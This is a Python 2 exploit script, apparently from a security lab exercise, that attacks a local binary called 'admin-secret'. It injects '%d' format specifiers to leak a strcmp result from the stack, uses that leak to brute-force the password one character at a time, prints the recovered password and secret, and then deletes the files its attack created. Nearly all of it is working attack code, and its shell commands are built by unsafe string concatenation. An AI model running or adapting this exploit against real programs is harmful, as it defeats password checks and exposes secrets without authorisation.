import os

#variable to store the guessed password
password = ''

#variable to store the character to be added to the password
char_to_add = 'a'

#variable to store the secret after cracking the application password
secret = None

#return the value of string comparison result between entered application password and actual application password from the stack frame
def get_stack_result(password, char):
        #execute admin-secret with a password string and store its output in output.txt
        command = '/home/bob/Public/admin-secret "'+ password + char + ' %d %d %d %d %d %d %d" > admin_output.txt'
        os.system(command)
        output = open('admin_output.txt')
        line = output.readline()
        #result variable is the 7th value in the stack
        strcmp_result = line[-3:-1].strip()
        result = int(strcmp_result)
        output.close()
        return result

#return the output of executing admin-secret with the guessed application password
def get_secret(password):
        command = '/home/bob/Public/admin-secret ' + password + ' > admin_secret.txt'
        os.system(command)
        output = open('admin_secret.txt')
        #read the first line of admin_secret.txt
        line = output.readline()
        output.close()
        return line

#keep guessing the password until the secret is obtained
while secret == None:
        #get the string comparison result after updating the password
        #begin with 'a' as the initial guess
        strcmp_result = get_stack_result(password, char_to_add)

        #guessed password is smaller than the actual application password, hence 1 is returned
        if strcmp_result == 1:
                #get the ASCII value of character added to the password
                char_to_add = ord(char_to_add)
                char_to_add += 1
                #update the character to be added to the next alphabet
                char_to_add = unichr(char_to_add)

        #guessed password is greater than the actual application password, hence -1 is returned
        else:
                #check if guessed password is the correct application password
                check_for_secret = get_secret(password+char_to_add)

                #print the correct password and the secret
                if 'Secret' in check_for_secret:
                        password = password + char_to_add
                        secret = check_for_secret
                        print "Password:", password
                        print secret.strip()

                #a character in the password sequence has been guessed correctly
                #update the guessed password for next iteration
                else:
                        #correct character is the one added in the previous iteration
                        char_to_add = ord(char_to_add)
                        char_to_add -= 1
                        char_to_add = unichr(char_to_add)
                        #update password to be guessed
                        password = password + char_to_add
                        #start by adding 'a' to the guessed password in next iteration
                        char_to_add = 'a'

#delete the files created by the attack
os.system('rm -rf admin_secret.txt admin_output.txt')